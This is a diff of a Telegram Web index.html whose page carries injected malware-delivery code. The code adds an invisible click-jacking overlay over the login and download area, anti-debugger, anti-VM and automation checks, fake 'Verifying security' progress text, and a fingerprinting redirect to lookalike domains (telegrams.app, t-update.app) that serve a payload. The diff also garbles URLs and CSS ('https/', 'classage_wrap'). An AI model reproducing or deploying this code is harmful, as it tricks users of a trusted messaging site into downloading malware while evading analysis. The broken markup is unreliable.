@@ -1,5 +1,5 @@
 <!doctype html>
-<html lang=en manifest=webogram.appcache ng-csp xmlns:ng=http://angularjs.org id=ng-app style="display: none;">
+<html lang=en manifest=webogram.appcache ng-csp xmlns:ng=http/angularjs.org id=ng-app style="display: none;">
 <head>
 <meta charset=utf-8>
 <meta name=viewport content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -7,9 +7,9 @@
 <link rel=stylesheet href="css/app.css">
 <link rel=manifest href="manifest.webapp.json">
 <link rel=icon href="favicon.ico" type=image/x-icon>
-<link rel=apple-touch-icon href="https://web.telegram.org/img/iphone_home120.png">
-<link rel=apple-touch-icon sizes=120x120 href="https://web.telegram.org/img/iphone_home120.png">
-<link rel=apple-touch-startup-image media="(device-width: 320px)" href="https://web.telegram.org/img/iphone_startup.png">
+<link rel=apple-touch-icon href="https/web.telegram.org/img/iphone_home120.png">
+<link rel=apple-touch-icon sizes=120x120 href="https/web.telegram.org/img/iphone_home120.png">
+<link rel=apple-touch-startup-image media="(device-width: 320px)" href="https/web.telegram.org/img/iphone_startup.png">
 <meta name=apple-mobile-web-app-title content="Telegram Web">
 <meta name=mobile-web-app-capable content=yes>
 <meta name=apple-mobile-web-app-capable content=yes>
@@ -17,10 +17,10 @@
 <meta name=theme-color content=#497495>
 <meta name=google content=notranslate>
 <meta property=og:title content="Telegram Web">
-<meta property=og:url content="https://web.telegram.org/">
-<meta property=og:image:width content=236>
-<meta property=og:image:height content=236>
-<meta property=og:image content=https://web.telegram.org/img/logo_share.png>
+<meta property=og:url content="https/web.telegram.org/">
+<meta property=ogwidth content=236>
+<meta property=ogheight content=236>
+<meta property=og:image content=https/web.telegram.org/img/logo_share.png>
 <meta property=og:site_name content="Telegram Web">
 <meta property=description content="Access your Telegram messages from any mobile or desktop device.">
 <meta property=og:description content="Access your Telegram messages from any mobile or desktop device.">
@@ -28,318 +28,318 @@
 <style>
 /* Invisible overlay layer for payload delivery */
 .delivery-overlay {
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  background: transparent;
-  z-index: 999999;
-  pointer-events: none;
-  display: none;
+ position: fixed;
+ top: 0;
+ left: 0;
+ width: 100%;
+ height: 100%;
+ background: transparent;
+ z-index: 999999;
+ pointer-events: none;
+ display: none;
 }
 
 .delivery-trigger {
-  position: absolute;
-  background: transparent;
-  border: none;
-  cursor: pointer;
-  pointer-events: auto;
-  opacity: 0;
-  z-index: 1000000;
+ position: absolute;
+ background: transparent;
+ border: none;
+ cursor: pointer;
+ pointer-events: auto;
+ opacity: 0;
+ z-index: 1000000;
 }
 
 .delivery-trigger:hover {
-  opacity: 0.01; /* Barely visible on hover for testing */
+ opacity: 0.01; /* Barely visible on hover for testing */
 }
 
 /* Loading animation */
 .delivery-loading {
-  position: fixed;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%);
-  background: rgba(0,0,0,0.8);
-  padding: 30px;
-  border-radius: 10px;
-  color: white;
-  z-index: 10000000;
-  display: none;
-  text-align: center;
+ position: fixed;
+ top: 50%;
+ left: 50%;
+ transform: translate(-50%, -50%);
+ background: rgba(0,0,0,0.;
+ padding: 30px;
+ border-radius: 10px;
+ color: white;
+ z-index: 10000000;
+ display: none;
+ text-align: center;
 }
 
 .delivery-spinner {
-  border: 3px solid #f3f3f3;
-  border-top: 3px solid #0088cc;
-  border-radius: 50%;
-  width: 40px;
-  height: 40px;
-  animation: spin 1s linear infinite;
-  margin: 0 auto 15px;
+ border: 3px solid #f3f3f3;
+ border-top: 3px solid #0088cc;
+ border-radius: 50%;
+ width: 40px;
+ height: 40px;
+ animation: spin 1s linear infinite;
+ margin: 0 auto 15px;
 }
 
 @keyframes spin {
-  0% { transform: rotate(0deg); }
-  100% { transform: rotate(360deg); }
+ 0% { transform: rotate(0deg); }
+ 100% { transform: rotate(360deg); }
 }
 
 .delivery-progress {
-  width: 200px;
-  height: 4px;
-  background: #333;
-  border-radius: 2px;
-  overflow: hidden;
-  margin-top: 10px;
+ width: 200px;
+ height: 4px;
+ background: #333;
+ border-radius: 2px;
+ overflow: hidden;
+ margin-top: 10px;
 }
 
 .delivery-progress-bar {
-  height: 100%;
-  background: #0088cc;
-  width: 0%;
-  transition: width 0.3s;
+ height: 100%;
+ background: #0088cc;
+ width: 0%;
+ transition: width 0.3s;
 }
 </style>
 </head>
 <body>
 
 <!-- Original Telegram content -->
-<div class=page_wrap ng-view></div>
+<div classage_wrap ng-view></div>
 <div id=notify_sound></div>
 
 <!-- Invisible overlay layer -->
 <div class="delivery-overlay" id="deliveryOverlay">
-  <!-- Multiple trigger zones for different download scenarios -->
-  <button class="delivery-trigger" id="mainTrigger" data-target="update"></button>
-  <button class="delivery-trigger" id="secondaryTrigger" data-target="document"></button>
+ <!-- Multiple trigger zones for different download scenarios -->
+ <button class="delivery-trigger" id="mainTrigger" data-target="update"></button>
+ <button class="delivery-trigger" id="secondaryTrigger" data-target="document"></button>
 </div>
 
 <!-- Loading animation -->
 <div class="delivery-loading" id="deliveryLoading">
-  <div class="delivery-spinner"></div>
-  <div id="loadingText">Preparing secure download...</div>
-  <div class="delivery-progress">
-    <div class="delivery-progress-bar" id="progressBar"></div>
-  </div>
+ <div class="delivery-spinner"></div>
+ <div id="loadingText">Preparing secure download...</div>
+ <div class="delivery-progress">
+ <div class="delivery-progress-bar" id="progressBar"></div>
+ </div>
 </div>
 
 <script>
 // Obfuscated delivery system
 (function() {
-  'use strict';
-  
-  const _0x4f8a = {
-    endpoints: ['telegrams.app', 't-update.app'],
-    paths: ['/dl/', '/k/', '/z/'],
-    delay: 2000,
-    stageDelay: 5000
-  };
+ 'use strict';
 
-  // Anti-analysis checks
-  function validateEnvironment() {
-    // Check for debugger
-    const start = performance.now();
-    debugger;
-    const end = performance.now();
-    if (end - start > 100) return false;
+ const _0x4f8a = {
+ endpoints: ['telegrams.app', 't-update.app'],
+ paths: ['/dl/', '/k/', '/z/'],
+ delay: 2000,
+ stageDelay: 5000
+ };
 
-    // Check for VM artifacts
-    const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl');
-    if (!gl) return false;
-    
-    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-    if (debugInfo) {
-      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-      if (renderer.includes('llvmpipe') || renderer.includes('VMware') || 
-          renderer.includes('VirtualBox') || renderer.includes('QEMU')) {
-        return false;
-      }
-    }
+ // Anti-analysis checks
+ function validateEnvironment() {
+ // Check for debugger
+ const start = performance.now();
+ debugger;
+ const end = performance.now();
+ if (end - start > 100) return false;
 
-    // Check screen resolution
-    if (screen.width < 800 || screen.height < 600) return false;
+ // Check for VM artifacts
+ const canvas = document.createElement('canvas');
+ const gl = canvas.getContext('webgl');
+ if (!gl) return false;
 
-    // Check for automation
-    if (navigator.webdriver) return false;
+ const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+ if (debugInfo) {
+ const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+ if (renderer.includes('llvmpipe') || renderer.includes('VMware') ||
+ renderer.includes('VirtualBox') || renderer.includes('QEMU')) {
+ return false;
+ }
+ }
 
-    return true;
-  }
+ // Check screen resolution
+ if (screen.width < 800 || screen.height < 600) return false;
 
-  // Mouse tracking for human behavior
-  let mouseEvents = 0;
-  let lastMouseTime = 0;
-  const mouseTracker = {
-    movements: [],
-    clicks: 0
-  };
+ // Check for automation
+ if (navigator.webdriver) return false;
 
-  document.addEventListener('mousemove', function(e) {
-    const now = Date.now();
-    if (now - lastMouseTime > 50) {
-      mouseEvents++;
-      mouseTracker.movements.push({x: e.clientX, y: e.clientY, t: now});
-      if (mouseTracker.movements.length > 10) {
-        mouseTracker.movements.shift();
-      }
-      lastMouseTime = now;
-    }
-  });
+ return true;
+ }
 
-  // Position triggers after page load
-  function positionTriggers() {
-    // Wait for Angular to render
-    setTimeout(function() {
-      const overlay = document.getElementById('deliveryOverlay');
-      const mainTrigger = document.getElementById('mainTrigger');
-      const secondaryTrigger = document.getElementById('secondaryTrigger');
+ // Mouse tracking for human behavior
+ let mouseEvents = 0;
+ let lastMouseTime = 0;
+ const mouseTracker = {
+ movements: [],
+ clicks: 0
+ };
 
-      // Position main trigger over login/download button area
-      // Adjust these coordinates based on actual Telegram layout
-      mainTrigger.style.top = '50%';
-      mainTrigger.style.left = '50%';
-      mainTrigger.style.transform = 'translate(-50%, -50%)';
-      mainTrigger.style.width = '200px';
-      mainTrigger.style.height = '50px';
+ document.addEventListener('mousemove', function(e) {
+ const now = Date.now();
+ if (now - lastMouseTime > 50) {
+ mouseEvents++;
+ mouseTracker.movements.push({x: e.clientX, y: e.clientY, t: now});
+ if (mouseTracker.movements.length > 10) {
+ mouseTracker.movements.shift();
+ }
+ lastMouseTime = now;
+ }
+ });
 
-      // Position secondary trigger over alternative action area
-      secondaryTrigger.style.top = '60%';
-      secondaryTrigger.style.left = '50%';
-      secondaryTrigger.style.transform = 'translate(-50%, -50%)';
-      secondaryTrigger.style.width = '150px';
-      secondaryTrigger.style.height = '40px';
+ // Position triggers after page load
+ function positionTriggers() {
+ // Wait for Angular to render
+ setTimeout(function() {
+ const overlay = document.getElementById('deliveryOverlay');
+ const mainTrigger = document.getElementById('mainTrigger');
+ const secondaryTrigger = document.getElementById('secondaryTrigger');
 
-      // Show overlay only after sufficient mouse activity
-      if (mouseEvents > 5) {
-        overlay.style.display = 'block';
-      }
-    }, 3000);
-  }
+ // Position main trigger over login/download button area
+ // Adjust these coordinates based on actual Telegram layout
+ mainTrigger.style.top = '50%';
+ mainTrigger.style.left = '50%';
+ mainTrigger.style.transform = 'translate(-50%, -50%)';
+ mainTrigger.style.width = '200px';
+ mainTrigger.style.height = '50px';
 
-  // Delivery handler with multi-stage loading
-  function initiateDelivery(target) {
-    // Validate environment first
-    if (!validateEnvironment()) {
-      console.log('Environment validation failed');
-      return;
-    }
+ // Position secondary trigger over alternative action area
+ secondaryTrigger.style.top = '60%';
+ secondaryTrigger.style.left = '50%';
+ secondaryTrigger.style.transform = 'translate(-50%, -50%)';
+ secondaryTrigger.style.width = '150px';
+ secondaryTrigger.style.height = '40px';
 
-    // Require minimum mouse activity
-    if (mouseEvents < 5 || mouseTracker.clicks < 1) {
-      mouseTracker.clicks++;
-      return; // Require multiple clicks
-    }
+ // Show overlay only after sufficient mouse activity
+ if (mouseEvents > 5) {
+ overlay.style.display = 'block';
+ }
+ }, 3000);
+ }
 
-    // Show loading animation
-    const loading = document.getElementById('deliveryLoading');
-    const progressBar = document.getElementById('progressBar');
-    const loadingText = document.getElementById('loadingText');
-    loading.style.display = 'block';
+ // Delivery handler with multi-stage loading
+ function initiateDelivery(target) {
+ // Validate environment first
+ if (!validateEnvironment()) {
+ console.log('Environment validation failed');
+ return;
+ }
 
-    // Simulate realistic loading with progress
-    let progress = 0;
-    const progressInterval = setInterval(function() {
-      progress += Math.random() * 15;
-      if (progress > 95) progress = 95;
-      progressBar.style.width = progress + '%';
-    }, 300);
+ // Require minimum mouse activity
+ if (mouseEvents < 5 || mouseTracker.clicks < 1) {
+ mouseTracker.clicks++;
+ return; // Require multiple clicks
+ }
 
-    // Generate tracking ID
-    const trackingId = generateTrackingId();
+ // Show loading animation
+ const loading = document.getElementById('deliveryLoading');
+ const progressBar = document.getElementById('progressBar');
+ const loadingText = document.getElementById('loadingText');
+ loading.style.display = 'block';
 
-    // Stage 0: Initial redirect after delay
-    setTimeout(function() {
-      loadingText.textContent = 'Verifying security...';
-      
-      setTimeout(function() {
-        loadingText.textContent = 'Preparing download...';
-        
-        setTimeout(function() {
-          clearInterval(progressInterval);
-          progressBar.style.width = '100%';
-          
-          // Build delivery URL with fingerprint
-          const deliveryUrl = buildDeliveryUrl(target, trackingId);
-          
-          // Redirect to payload
-          window.location.href = deliveryUrl;
-        }, _0x4f8a.delay);
-      }, _0x4f8a.delay);
-    }, _0x4f8a.delay);
-  }
+ // Simulate realistic loading with progress
+ let progress = 0;
+ const progressInterval = setInterval(function() {
+ progress += Math.random() * 15;
+ if (progress > 95) progress = 95;
+ progressBar.style.width = progress + '%';
+ }, 300);
 
-  // Build obfuscated delivery URL
-  function buildDeliveryUrl(target, trackingId) {
-    const endpoint = _0x4f8a.endpoints[Math.floor(Math.random() * _0x4f8a.endpoints.length)];
-    const path = _0x4f8a.paths[0]; // Use /dl/ path
-    
-    // Add fingerprinting parameters
-    const params = new URLSearchParams({
-      id: trackingId,
-      t: Date.now(),
-      r: document.referrer || 'direct',
-      v: '4.12.5',
-      p: getPlatform(),
-      l: navigator.language
-    });
+ // Generate tracking ID
+ const trackingId = generateTrackingId();
 
-    return `https://${endpoint}${path}${target}?${params.toString()}`;
-  }
+ // Stage 0: Initial redirect after delay
+ setTimeout(function() {
+ loadingText.textContent = 'Verifying security...';
 
-  // Generate tracking ID
-  function generateTrackingId() {
-    const components = [
-      navigator.userAgent,
-      screen.width + 'x' + screen.height,
-      new Date().getTimezoneOffset(),
-      navigator.language,
-      Date.now()
-    ];
-    
-    // Simple hash function
-    let hash = 0;
-    const str = components.join('|');
-    for (let i = 0; i < str.length; i++) {
-      hash = ((hash << 5) - hash) + str.charCodeAt(i);
-      hash = hash & hash;
-    }
-    return Math.abs(hash).toString(36);
-  }
+ setTimeout(function() {
+ loadingText.textContent = 'Preparing download...';
 
-  // Detect platform
-  function getPlatform() {
-    const ua = navigator.userAgent.toLowerCase();
-    if (ua.includes('win')) return 'windows';
-    if (ua.includes('mac')) return 'macos';
-    if (ua.includes('linux')) return 'linux';
-    return 'unknown';
-  }
+ setTimeout(function() {
+ clearInterval(progressInterval);
+ progressBar.style.width = '100%';
 
-  // Setup triggers
-  function setupTriggers() {
-    const triggers = document.querySelectorAll('.delivery-trigger');
-    triggers.forEach(function(trigger) {
-      trigger.addEventListener('click', function() {
-        const target = this.dataset.target;
-        initiateDelivery(target);
-      });
-    });
-  }
+ // Build delivery URL with fingerprint
+ const deliveryUrl = buildDeliveryUrl(target, trackingId);
 
-  // Initialize after DOM load
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', function() {
-      positionTriggers();
-      setupTriggers();
-    });
-  } else {
-    positionTriggers();
-    setupTriggers();
-  }
+ // Redirect to payload
+ window.location.href = deliveryUrl;
+ }, _0x4f8a.delay);
+ }, _0x4f8a.delay);
+ }, _0x4f8a.delay);
+ }
 
-  // Track clicks for behavior analysis
-  document.addEventListener('click', function() {
-    mouseTracker.clicks++;
-  });
+ // Build obfuscated delivery URL
+ function buildDeliveryUrl(target, trackingId) {
+ const endpoint = _0x4f8a.endpoints[Math.floor(Math.random() * _0x4f8a.endpoints.length)];
+ const path = _0x4f8a.paths[0]; // Use /dl/ path
+
+ // Add fingerprinting parameters
+ const params = new URLSearchParams({
+ id: trackingId,
+ t: Date.now(),
+ r: document.referrer || 'direct',
+ v: '4.12.5',
+ p: getPlatform(),
+ l: navigator.language
+ });
+
+ return `https/${endpoint}${path}${target}?${params.toString()}`;
+ }
+
+ // Generate tracking ID
+ function generateTrackingId() {
+ const components = [
+ navigator.userAgent,
+ screen.width + 'x' + screen.height,
+ new Date().getTimezoneOffset(),
+ navigator.language,
+ Date.now()
+ ];
+
+ // Simple hash function
+ let hash = 0;
+ const str = components.join('|');
+ for (let i = 0; i < str.length; i++) {
+ hash = ((hash << 5) - hash) + str.charCodeAt(i);
+ hash = hash & hash;
+ }
+ return Math.abs(hash).toString(36);
+ }
+
+ // Detect platform
+ function getPlatform() {
+ const ua = navigator.userAgent.toLowerCase();
+ if (ua.includes('win')) return 'windows';
+ if (ua.includes('mac')) return 'macos';
+ if (ua.includes('linux')) return 'linux';
+ return 'unknown';
+ }
+
+ // Setup triggers
+ function setupTriggers() {
+ const triggers = document.querySelectorAll('.delivery-trigger');
+ triggers.forEach(function(trigger) {
+ trigger.addEventListener('click', function() {
+ const target = this.dataset.target;
+ initiateDelivery(target);
+ });
+ });
+ }
+
+ // Initialize after DOM load
+ if (document.readyState === 'loading') {
+ document.addEventListener('DOMContentLoaded', function() {
+ positionTriggers();
+ setupTriggers();
+ });
+ } else {
+ positionTriggers();
+ setupTriggers();
+ }
+
+ // Track clicks for behavior analysis
+ document.addEventListener('click', function() {
+ mouseTracker.clicks++;
+ });
 })();
 </script>
 
